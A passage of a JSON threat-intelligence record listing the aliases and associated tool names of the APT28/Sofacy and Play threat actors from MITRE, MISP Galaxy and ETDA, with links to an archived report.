            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535674,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1653787332,
    "ts_modification_date": 1653787332,
    "files": {
        "pdf": "https://archive.orkl.eu/91689746aeb74da1ce20e558a75c1162dc8ce213.pdf",
        "text": "https://archive.orkl.eu/91689746aeb74da1ce20e558a75c1162dc8ce213.txt",
        "img": "https://archive.orkl.eu/91689746aeb74da1ce20e558a75c1162dc8ce213.jpg"
    }
}